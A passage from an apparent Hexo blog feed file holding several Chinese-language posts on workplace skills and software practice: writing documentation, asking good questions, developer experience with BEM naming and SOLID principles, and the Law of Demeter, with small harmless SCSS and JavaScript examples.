        <content type="html"><![CDATA[<p>為你寫下這份文件，陪著你和專案一起往下走。</p><blockquote><p>如果你，忘了 Code<br>就讓文件，代替我<br>如果你，記得 Code<br>你和 Code，就好過</p></blockquote><iframe width="560" height="315" src="https://www.youtube.com/embed/V9sWPHGbESM?si=xx0mLpo_VnG6eIqC" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><p>有時候公司會把員工斷捨離，員工也會斷捨離公司。</p><blockquote><p>技術人員雖然會離開，但要讓知識可以留下來</p></blockquote><p>在前一篇文章中<a href="https://linyencheng.github.io/2023/10/09/simplify-your-life/how-to-ask-questions/">提到了問問題的重要性</a>，這篇文章想來談談在職場中的另外一個技能 <code>文件撰寫</code>。</p><p>對軟體開發來說寫好文件是一項必備技能，不論是在新人培養、部門技術分享、專案規格溝通，甚至離職交接，優秀的文件撰寫能夠使團隊運作更順暢。</p><p>寫好文件其實我覺得不太困難，大家從小到大都寫了很多報告，但到了職場之後卻又把過往的訓練拋棄我覺得有點可惜。</p><p>長久下來，我認為一份好的文件確認兩個重點通常就能夠有不錯的表現:</p><ol><li>文件目的</li><li>讀文件的對象</li></ol><blockquote><p>寫好文件被誇獎其實也會有成就感<br><img src="https://linyencheng.github.io/2023/10/10/simplify-your-life/how-to-write-documentation/doc-quick-start.PNG" alt="doc-quick-start"></p></blockquote><h2 id="文件撰寫目的"><a href="#文件撰寫目的" class="headerlink" title="文件撰寫目的"></a>文件撰寫目的</h2><p>在開始動手之前，必須確認為什麼要寫這份文件？</p><ul><li>文件的目的是為了資訊的傳遞</li></ul><p>在資訊傳遞上最重要的是持續維持大家的 context</p><ul><li>事前少量揭露，事後的總結</li><li>確認對方想法</li><li>確認議題結束</li></ul><p>希望達成的目標與結果是什麼？是為了傳達信息、教育讀者、解決問題還是其他原因？</p><ul><li>指明文件預期的結果: 例如讀者將能夠理解某個概念、執行特定的操作，或解決特定的問題</li><li>預期讀者獲得什麼資訊: 確保文件中包含讀者最需要的資訊</li></ul><h3 id="文件撰寫的目標對象"><a href="#文件撰寫的目標對象" class="headerlink" title="文件撰寫的目標對象"></a>文件撰寫的目標對象</h3><p>訊息的投放不管在哪種領域中，了解你的目標對象並針對對象優化都是一門課題。</p><p>底下是動筆前值得思考的問題:</p><ul><li>誰會看這份文件？</li><li>如何使用這份文件？</li><li>預期在這份文件得到哪些資訊？</li><li>習慣的文件格式是什麼樣子？</li></ul><p>確定你的目標對象，並考慮他們的背景知識和需求來調整文件內容和風格，確保更有效地傳達資訊。</p><p>舉三個不同對象的例子:</p><ol><li>專案經理 (PM): 文件的目的是要協助對更上層交差協助他們更好地理解和管理專案，透過總結列點、淺顯易懂的說明、運用圖文穿插就會是較好的文件撰寫方式</li><li>接手工程師: 文件需要提供足夠的資訊，這個部分可以參考開源專案的 README.md 或 Quick Start Guide，目標是協助對象在短時間內了解專案的關鍵知識和步驟</li><li>針對大眾: 部落格教學文章，可能需要提供可複製和貼上的程式碼、關鍵步驟的圖文解釋，並提供完整的參考資料供讀者深入學習</li></ol><h2 id="文件分類"><a href="#文件分類" class="headerlink" title="文件分類"></a>文件分類</h2><ul><li>是主要文件還是參考文件: 文件可能是主要的指南也可能僅作為參考，標示清楚可以幫助讀者理解用途</li><li>習慣的文件格式: 考慮到讀者可能已經習慣了某種文件格式，使用這種格式可能更容易被接受</li></ul><p>根據不同的需求，選擇適當的文件類型能夠更好地傳遞訊息。</p><p>文件可以分為多種類型，例如專案計劃、需求規格、設計文件、程式碼註釋、測試計劃和報告、使用者文件以及快速入門指南。</p><ul><li>專案計劃: 專案計劃文件包括目標、時程表、預算、資源分配以及負責人</li><li>需求規格: 具體明確的描述專案的功能和功能需求，以便開發團隊能夠準確理解和實做</li><li>設計文件: 描述系統的結構和流程，包含系統架構圖、數據庫設計和界面設計</li><li>程式碼註釋: 在寫程式碼寫到自己都看不太懂的，務必寫詳細的註釋</li><li>測試計劃和報告: 寫測試劇本說明測試的範圍、測試用例和預期結果</li><li>使用者文件：特規的地方該如何使用</li><li>快速入門：每個專案都一定要有，特別是如果有自定義的腳本時也要特別說明</li></ul><h2 id="文件的好處"><a href="#文件的好處" class="headerlink" title="文件的好處"></a>文件的好處</h2><p>相信大家會來看這個部落格，大部分都是在網路或科技相關領域工作，所以就先用工程師的角度來談談，文件之於專案進行就像是框架之於應用開發，對工程師來說使用框架有什麼好處?</p><ul><li>省時間: 不用再研究和交代基礎建設類問題，離職交接很快</li><li>學觀念: 能透過框架學習準則，了解目前業界遇到了什麼問題</li><li>抄作業: 通常框架說明書也會提供 Best Practices</li></ul><p>其實相關的優點是類似的，對於專案進行，文件有什麼好處?</p><ul><li>省時間: 如果同樣一份文件給所有人看，只有一個人看不懂? 我們找出瓶頸就很棒了，剩下讓能處理的處理?</li><li>學觀念: 看過前人遺毒後，能了解公司遇到問題是怎麼解決的</li><li>抄作業: 寫完一遍可以廣泛用在各種教育訓練、離職交接、進度報告文件上</li></ul><p>寫好文件會有哪些好處?</p><ul><li>同時和多人進行非同步的溝通</li><li>撰寫一次卻能到處使用</li></ul><h3 id="同時和多人進行非同步的溝通"><a href="#同時和多人進行非同步的溝通" class="headerlink" title="同時和多人進行非同步的溝通"></a>同時和多人進行非同步的溝通</h3><p>當然面對面有無法取代的好處，但我認為技術相關畢竟是密度較高的訊息，口語的溝通比起文件溝通又更難一些，為什麼口語又更難，因為文件可以附上參考資料，口語還要在訊息投放時針對受眾即時的進行轉譯和客製化，也就是花很多時間降維到足夠對方吸收為止，且還要確認對方理解後才能繼續往下。</p><p>寫文件的好處是花時間寫好一次就可以同時跟很多需要資訊的人進行溝通，而不需要在受限制的時間、地點下進行有失敗機率的訊息同步，文件原則上一群人有八成能看懂我們就不需要再花時間處理剩下兩成，除非那兩成是你的老闆。</p><h3 id="一次撰寫，到處使用-Write-Once-Use-Everywhere"><a href="#一次撰寫，到處使用-Write-Once-Use-Everywhere" class="headerlink" title="一次撰寫，到處使用 (Write Once Use Everywhere)"></a>一次撰寫，到處使用 (Write Once Use Everywhere)</h3><p>職場上的文件有另外一個顯而易見的好處，就是能夠一稿多投。</p><p>舉例來說為了讓同事一起成長而決定在部門內分享新知或是專案處理方式，不但可以正大光明用上班時間來做自己想做的事情，還可以順便當作提早離職交接的概念，因為到時候離職也是可以講同一份文件，寫好一份文件，我最常一稿多投的情境有</p><ul><li>進度報告</li><li>讀書會知識分享</li><li>專案回顧</li><li>離職交接</li></ul>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 職場老鳥必點技能 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提問嗎?你要去哪裡?</title>
      <link href="/2023/10/09/simplify-your-life/how-to-ask-questions/"/>
      <url>/2023/10/09/simplify-your-life/how-to-ask-questions/</url>
      
        <content type="html"><![CDATA[<p>大家有沒有遇過底下的經驗</p><ul><li>不管是東西還是答案，找了很久卻又沒有方向，找不到在哪裡?</li><li>想找人問問題，不知道該怎麼問問題?</li><li>問了問題又問不出想要的答案又或是對方不想回答?</li></ul><p>許多人可能在初入職場時像小編一樣更傾向於獨自執行任務，有時候也認為單打獨鬥能夠提高效率，比較少透過問問題來互動。</p><p>在職場中，問好問題可以說是職場必點技能，小編曾經也很不會問問題，更不會透過對話練習讓其他人能夠問對問題，後來是在遇到聰明的同事、學長姊學弟妹後才慢慢開竅，接下來小編想來分享這些年來一些提問上的微小經驗。</p><h2 id="提問的目的"><a href="#提問的目的" class="headerlink" title="提問的目的"></a>提問的目的</h2><p>問好問題跟打電動破關的概念其實是相通的，這個過程需要一定的準備和技巧，就如遊戲中的角色分類、攻略、密技</p><ul><li>分類: 理解現在的情境才知道要怎麼往後進行攻略和秘技的查找</li><li>攻略: 是我們需要針對問題做好事前準備</li><li>秘技: 則是掌握問問題的相關技巧</li></ul><p>通常提問都是為了到達一個目標，而問好問題就是一個破關的過程，無論是在尋找遊戲中的答案還是在職場中解決問題，目的都是能夠更快達成目標。</p><blockquote><p>生命以時間為單位，浪費別人的時間是謀財害命，浪費自己的時間則是慢性自殺<br>魯迅</p></blockquote><p>能夠清晰地提出問題時，回答者更容易理解需求，進而提供準確的答案，節省了雙方的寶貴時間。</p><h2 id="問題的分類"><a href="#問題的分類" class="headerlink" title="問題的分類"></a>問題的分類</h2><p>當談到問問題時，我們必須明確地區分 <code>Problem</code> 和 <code>Question</code></p><ul><li>Problem: 遇到的具體困難或挑戰<ul><li>不知道自己要什麼: 需要一個更基本的問題，來協助確定目標或方向</li></ul></li></ul><blockquote><p>如果你不知道你要去哪裡，那麼現在你在哪裡一點都不重要<br>愛麗絲夢遊仙境</p></blockquote><ul><li>Question: 如何準確地提問和定義這些問題<ul><li>知道自己要什麼: 明確知道需要什麼，但不確定如何獲得，只需要找到達成目標的資訊或方法</li></ul></li></ul><blockquote><p>To be or not to be. That is a question.<br>哈姆雷特</p></blockquote><p>當提問時，我們的是目標是將 <code>Problem</code> 轉化成 <code>Question</code>，而不是一得到 <code>Problem</code> 就拿去問人，一得到 <code>Problem</code> 就拿去問人就好像拿消防栓灌屎去噴其他人一樣，得不到答案正常得到答案要感恩。</p><iframe width="560" height="315" src="https://www.youtube.com/embed/s-zRAQmKUkI?si=VpZT4EGbbjGmRImr" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><h2 id="針對問題事前準備"><a href="#針對問題事前準備" class="headerlink" title="針對問題事前準備"></a>針對問題事前準備</h2><p>通常請教的對象會理解的比你多，而對方能從問題中了解你為了這個問題準備了多少或做了哪些嘗試。</p><p>以資訊領域來說我認為問問題前，可以先做到的事情:</p><ol><li>用 Google 關鍵字搜尋答案</li><li>搜尋官方文件、常見問題文件 (FAQ)</li><li>到相關論壇搜尋</li><li>嘗試先自己檢查或實驗來找到答案</li><li>加入相關社團或群組爬文</li><li>看原始碼</li><li>萬事問臉書的發文</li></ol><p>網路上有一篇極為經典的教學 “<a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way">提問的智慧</a>“，我認為資訊領域如果沒有讀過，真的應該要好好拜讀一波。</p><h2 id="提問的步驟"><a href="#提問的步驟" class="headerlink" title="提問的步驟"></a>提問的步驟</h2><p>問好問題的關鍵在於能夠清晰地定義下一步該做什麼，這是問問題的核心。</p><ol><li>定義和拆解問題並明確確認問題的性質<ul><li>具體的問題: 例如技術錯誤</li><li>抽象的挑戰: 如果感到困惑，可以用心靈和身體的感覺來區分</li></ul></li><li>仔細、清楚描述問題: 包括任何資訊環境設定，例如機器配置、作業系統、應用程式版本等等</li><li>描述自己的研究和理解過程: 說明您已經嘗試過哪些步驟來解決問題，是否有其他解決方法</li><li>提供重現問題的方法: 如果可能的話，描述如何在相同的環境中重現問題，包括相關的環境設定和步驟</li></ol><p>問好問題是一個技能，通過清晰的問題定義和提供詳細的資訊，我們可以更有效地解決問題並協助他人理解和解決問題。</p><p>提問的過程中著重在盡量將蒐集過重要的資訊和脈絡講清楚</p><ol><li>目的: 確認對方想法</li><li>結果: 確定議題結束</li></ol><blockquote><p>問法一: 客⼾說，這個功能兩個禮拜後要完成<br>問法二: 剛剛跟客⼾開會，客⼾三週後要跟⻑官報告，但目前還有⼀些問題，想確認⽬前您的⼯作項⽬與優先順序以及是否有時間處理這個項目？</p></blockquote><hr><blockquote><p>問法一: 請問 https 是什麼意思？<br>問法二: 網路上說 https 技術可以讓通訊加密溝通，但我還是有點不了解應⽤⽅式，可以請你評估看看讓我了解是否適合⽤在這個專案嗎？</p></blockquote><hr><blockquote><p>問法一: ⽼闆，你要這個嗎？<br>問法二: 經評估為產⽣ X 效益，⽬前規劃 3 種⽅案，這些⽅案差異在於過程要注意 X、因此目前對策是 X 且會需要 X 部⾨資源，想了解您的想法和建議?</p></blockquote><hr><blockquote><p>問法一: 上次說的購物車功能，開發好了嗎？<br>問法二: 關於購物車的流程優化的功能， 原本預計下週三完成，⽬前還順利嗎？</p></blockquote><h2 id="描述問題的技巧"><a href="#描述問題的技巧" class="headerlink" title="描述問題的技巧"></a>描述問題的技巧</h2><p>工程師在專案的進行中很常會碰到其他部門的人反映目前專案的功能出現問題，最大的困擾卻是理解問題並提供解決方案，這就是 Cosplay 通靈王。</p><blockquote><p><img src="https://memeprod.sgp1.digitaloceanspaces.com/user-wtf/1628234870113.jpg"></p></blockquote><ul><li>定義和拆解問題<ul><li>覺得上班有種被困住的感覺，所以請問是心靈感覺被困住還是身體被困住?</li></ul></li><li>仔細、清楚描述問題<ul><li>環境: 機器配置、作業系統、應用程式、以及版本號相關的資訊</li></ul></li><li>描述自己是怎麼研究和理解這個問題<ul><li>為了確定問題有做了哪些步驟</li><li>嘗試過哪些解決方法</li><li>最近是否有做過什麼變更，不管是硬體或軟體?</li></ul></li><li>該怎麼重現這個問題的，包含環境設定和步驟</li></ul><blockquote><p>比起扮演通靈王，更應該扮演柯南<br><img src="https://memeprod.sgp1.digitaloceanspaces.com/user-wtf/1594704926296.jpg" alt="真相只有一個"></p></blockquote><p>網路上這篇神作 “<a href="https://www.chiark.greenend.org.uk/~sgtatham/bugs-tw.html">如何有效地報告錯誤</a>“，也非常推薦!!!一定要讀!!!</p><h3 id="3C-問句"><a href="#3C-問句" class="headerlink" title="3C 問句"></a>3C 問句</h3><p>在這方面，我們可以用 3C 問句 Cause、Conditions、Concern 去理解和定義問題</p><ul><li>Cause: 了解問題的根本原因，為什麼出現這個問題？是什麼導致了問題的發生？</li><li>Conditions: 詳細描述問題的條件和環境，像是機器配置、作業系統、應用程式版本等相關資訊</li><li>Concern: 產生的影響以及希望解決它的原因，目標是確定問題的重要性</li></ul><p>底下舉兩個實際的例子也許會更有感覺</p><ol><li>在工作中感到困惑，並想要提出一個問題:<ul><li>Cause: 覺得上班有一種被困住的感覺，因此需要更好地理解這種感覺的來源</li><li>Conditions: 環境包括工作場所、工作流程、團隊合作等，需要詳細描述這些條件</li><li>Concern: 關注的是這種感覺對工作和生活的影響，以及如何改善它以提高效率和滿意度</li></ul></li><li>當工程師在專案中遇到問題時，當其他部門的人報告專案功能出現問題時:<ul><li>Cause: 要了解問題的根本原因，例如是軟體錯誤、硬體問題還是其他因素導致的</li><li>Conditions: 描述報告問題的環境，包括操作系統、應用程式版本等</li><li>Concern: 關注問題對專案進度和最終交付的影響，以便採取適當的措施</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 職場老鳥必點技能 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>One Piece X 開發者體驗</title>
      <link href="/2023/10/08/simplify-your-life/thinking-developer-experience/"/>
      <url>/2023/10/08/simplify-your-life/thinking-developer-experience/</url>
      
        <content type="html"><![CDATA[<p>大家有沒有一種經驗就是每次剛搬完家很多急著要用的東西都會找不到，但又要用就只好又買一組新的，寫程式也是一樣的概念，來了一個新需求以前我們到底有沒有做過? 有做過的話要去哪裏找該怎麼找?</p><blockquote><p>究竟是來當工程師是進行軟體開發還是來當海賊王尋找 One Piece</p></blockquote><h2 id="開發者體驗"><a href="#開發者體驗" class="headerlink" title="開發者體驗"></a>開發者體驗</h2><p>什麼是開發者體驗 (Developer Experience)?</p><p>開發者體驗 (DX) 是指開發者在開發軟體時所感受到的一切，包括工具、框架、程式碼結構、文件、測試、調試等方面的體驗。</p><p>一個好的 DX 可以提高開發效率，降低錯誤率，並鼓勵開發者樂意參與和貢獻。</p><p>開發者體驗其實就是從 UI&#x2F;UX 來評估開發者的日常行為</p><ul><li>User Interface: 開發者的使用者介面就是程式碼</li><li>User Experience: 好的使用者體驗除了包含了好的使用者介面外，開發環境提供語法高亮、自動完成等功能也是重要的環節</li></ul><p>對開發者來說，常見的使用者情境大多為加新功能、修正問題、極端案例測試三種</p><ol><li>加新功能: 找到適合的位置後加上對應程式碼且沒有增加新的問題</li><li>修正問題: 找到問題在程式碼中的位置，修正並測試且沒有增加新的問題</li><li>極端案例測試: 找到發生位置並測試極端值是否會讓程式碼不正常運作</li></ol><p>可以發現開發者會不斷進行 “尋找” → “閱讀” → “修改” 的過程，所以接下來也分成兩個部份來進行優化</p><ol><li>程式碼 SEO: 優化尋找</li><li>SOLID: 優化閱讀</li></ol><h2 id="程式碼-SEO"><a href="#程式碼-SEO" class="headerlink" title="程式碼 SEO"></a>程式碼 SEO</h2><p>當需要修改時，相關的程式碼好找嗎? 會不會找到很多無關的程式碼放在一起? 舉例來說我們就可以將相近功能的程式都放在一起，這樣直觀的設計能夠更快的幫助新進人員進入專案協助。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">├── Login/</span><br><span class="line">│  ├── SocialButton/</span><br><span class="line">│  │  ├── LineButton.js         # 社群登入的 Line 按鈕</span><br><span class="line">│  │  └── FacebookButton.js     # 社群登入的 FB 按鈕</span><br><span class="line">│  ├── Modal/</span><br><span class="line">│  │  └── ModalLogin.js         # 登入的 Modal</span><br><span class="line">│  └── index.js                 # 登入邏輯與主要 Layout</span><br></pre></td></tr></table></figure><p>對工程師來說，會忘記之前寫的東西在哪是很合理的，所以在 IDE 有支援搜尋的前提下，我們就需要針對程式碼做一定程度的 SEO，一個最棒的搜尋結果就是當使用者輸入一個關鍵字後只會得到一個最適合的結果。</p><p>舉例前端的例子來說，一般團隊有可能會使用 BEM 的命名規則，像是 <code>info__title</code> 這樣代表我們設定的是訊息的標題，所以當進行搜尋時 <code>info__title</code> 就會是我們的關鍵字，如果是底下示範的第一種寫法反而會造成開發者的困擾。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad 用 .info 才能找，且找到後還要再找第二層</span></span><br><span class="line"><span class="selector-class">.info</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">1%</span> <span class="number">2%</span>;</span><br><span class="line">  &amp;__title &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">1%</span> <span class="number">0</span> <span class="number">1%</span> <span class="number">2%</span>;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Good 大多情境可一次就找到</span></span><br><span class="line"><span class="selector-class">.info</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">1%</span> <span class="number">2%</span>;</span><br><span class="line">  <span class="selector-class">.info__title</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">1%</span> <span class="number">0</span> <span class="number">1%</span> <span class="number">2%</span>;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="命名"><a href="#命名" class="headerlink" title="命名"></a>命名</h3><p>方便搜尋的命名代表程式碼有多方便被修改</p><ul><li>保持命名的一致性: camelCase、snake_case</li><li>使用描述性的前綴: is<em>表示布林值、str</em>表示字串</li><li>避免縮寫: 保密防諜的是對外而不是對內，例如應該使用 numberOfItems 而不是 numItems</li><li>避免名稱衝突: 確保相似概念的變數都有作用域或是命名空間保護</li><li>目的明確的命名: 避免使用模棱兩可或不明確的名稱，而應該選擇能夠清楚表達目的的名稱，名稱應該反映其功能、用途或內容<ul><li>確定 (OK) &#x2F; 取消 (Cancel): 使用者確定了什麼取消了什麼</li><li>送出 (Send)&#x2F;繼續編輯 (Keep Editing): 可以推測出是送出文章和取消送出且繼續編輯</li><li>更新使用者資料使用 getUserInfo() 而不是 getData()</li></ul></li></ul><p>舉個例子來說判斷盡量用布林值的概念命名會更方便，隱藏的條件就可以用 isVisible 或是 isDisable 的布林值來控制條件渲染。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getNowElement</span>(<span class="params">&#123; isVisible, isDisable &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> isHidden = !isVisible || isDisable;</span><br><span class="line">  <span class="keyword">if</span> (isHidden) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>show<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>雖然布林值算好讀，但當命名和布林值寫在判斷式中時，會發現我們還是需要進行思考，也較不直觀，底下舉了兩種例子，可以發現第二種命名來說就會更直觀一些。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">VISIBLE</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">HIDDEN</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要稍微思考</span></span><br><span class="line"><span class="keyword">if</span> (element.<span class="property">visible</span> === <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 幾乎不需要思考</span></span><br><span class="line"><span class="keyword">if</span> (element.<span class="property">visibility</span> === <span class="variable constant_">VISIBLE</span>)</span><br><span class="line"><span class="keyword">if</span> (element.<span class="property">visibility</span> === <span class="variable constant_">HIDDEN</span>)</span><br></pre></td></tr></table></figure><h2 id="SOLID"><a href="#SOLID" class="headerlink" title="SOLID"></a>SOLID</h2><p>SOLID 分別代表了六個原則的縮寫</p><ul><li><a href="https://linyencheng.github.io/2023/09/25/simplify-your-life/single-responsibility-principle/">Single Responsibility Principle</a>: 一個類別應該只有一個單一的職責，SRP 的目標是減少同個區塊中不相關的邏輯，將相關的功能組織在一起，使開發者更容易找到所需的功能</li><li><a href="https://linyencheng.github.io/2023/10/02/simplify-your-life/api-first-with-domain-model/">Open Closed Principle</a>: 對於擴展是開放的，但對於修改是封閉的，需要新功能時應該透過擴展現有程式碼來實現，而不是修改原始程式碼</li><li><a href="https://linyencheng.github.io/2023/10/06/simplify-your-life/liskov-substitution-principle/">Liskov Substitution Principle</a>: 子類別應該能夠替換父類別，而不會影響程式的正確性，這建立一致性的介面和行為讓開發者不會認知失調，也不會分不清楚是菜鳥還是實習生更不會叫錯名字</li><li><a href="https://linyencheng.github.io/2023/10/07/simplify-your-life/least-knowledge-principle/">Least Knowledge Principle</a>: 一個模組不應該知道太多關於其他模組的內部細節，只與最接近它的朋友(直接相互依賴的模組)互動，有些事情知道的太多不是好事</li><li><a href="https://linyencheng.github.io/2023/10/05/simplify-your-life/interface-segregation-principle/">Interface Segregation Principle</a>: 將介面簡化為只包含必要的方法，減少開發者需要關心的內容</li><li><a href="https://linyencheng.github.io/2023/09/30/simplify-your-life/dependency-inversion-principle/">Dependency Inversion Principle</a>: 透過依賴的反轉，我們可以不再被物件牽制，真的去使用東西而不是被東西使用</li></ul><p>SOLID 原則有助於將程式碼模組化，使不同的功能和關注點分開，目標是當被開發者找到程式碼後，可以更快確認在哪一行產生目前的行為，更容易去判斷在這一階層 (頁面) 的操作只要正確就可以不用煩惱其他階層的任何操作，專注於特定的功能而不必擔心整個系統的細節，進而更容易且安全的去修改和擴展程式碼。</p>]]></content>
      
      
      <categories>
          
          <category> Frontend </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>離職後的君子之交淡如水 X 最小知識原則</title>
      <link href="/2023/10/07/simplify-your-life/least-knowledge-principle/"/>
      <url>/2023/10/07/simplify-your-life/least-knowledge-principle/</url>
      
        <content type="html"><![CDATA[<p>假設住在一個家庭中，家中有不同的成員，每個人都有自己的物品需要收納，例如衣物、書籍、玩具等。</p><p>如果家中的每位成員都知道其他成員物品的詳細位置和收納方式且可以修改，最終就需要相互詢問才能找到自己需要的物品，因為每個人都需要記住其他人的物品放在哪裡，互相之間的合作變得複雜。此外，當一個人重新安排或調整了自己的物品時，其他人可能會受到影響，因為他們習慣了特定的收納方式。</p><p>家中的不同收納區域代表了一個複雜的收納系統，而每位家庭成員則代表系統中的不同模組或類別。在軟體開發中，這種情況就好比模組之間直接相互依賴，彼此知道對方的內部實現方式，這樣一來，任何變更都可能影響到其他模組，導致系統變得脆弱且難以維護。</p><h2 id="Least-Knowledge-Principle"><a href="#Least-Knowledge-Principle" class="headerlink" title="Least Knowledge Principle"></a>Least Knowledge Principle</h2><p>最少知識原則 Least Knowledge Principle 又叫做 Law of Demeter 認為一個物件 (或模組)不應該了解太多關於其他物件的細節，每個單元只能和自己直接的朋友交談，不能和陌生單元交談。</p><p>用去耦合的概念來看，物件間都應該君子之交淡如水，不需要知道太多對方的相關情況。</p><p>舉個同事離職的情況來說，人與人之間不需要講得太清楚，同事之間禮貌上交代離職原因就是說出考量家庭因素、生涯發展、個人能力這幾項原因即可，並不用詳細的交代去向還有真正的離職原因。</p><p>因為即使清楚知道同事真正的離職原因你也不一定會過得比較好，因為當發現離職同事表現很優秀但年度調薪只有 500 塊，整天跟老闆聊天喝下午茶的調薪 5000 塊，甚至同事交代離職原因也可能會影響團隊的工作氛圍，因為同事們離職後下一個工作年薪平均 +50%-100%，這個就是在工作上過度理解其他模組的壞處。</p><p>最少知識原則在工作上就是將他的工作進度、技術細節和專案細節都記錄在文件中，並確保其他同事可以輕鬆地查詢這些資訊，離職當下僅僅需要透過文件不需要花費過多精力去了解對方，這有助於降低耦合度，提高程式碼的可維護性和可讀性。</p><p>以之前的例子來說明:</p><ul><li>玩家物件: 封裝了<strong>自己的</strong>屬性和方法，與其他玩家無關</li><li>建立函式: createPlayer 和 createAdvancedPlayer 函數只需要知道有關<strong>自己的</strong>基本屬性和檢查方法，與其他玩家無關</li><li>資料處理: processPlayerData 只關心 Player 介面提供的 checkPlayerCondition 和 checkAdvancedPlayerCondition 方法，不需要知道特定玩家物件的內部結構，僅使用抽象的介面提供的公開函式</li></ul><p>在軟體開發中，每個模組只關心自己的內部實現，不需要知道其他模組的詳細資訊，變更一個模組不能對其他模組造成意外的影響。離職的同事當然也是。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定義一個函數，用於檢查玩家的健康狀態</span></span><br><span 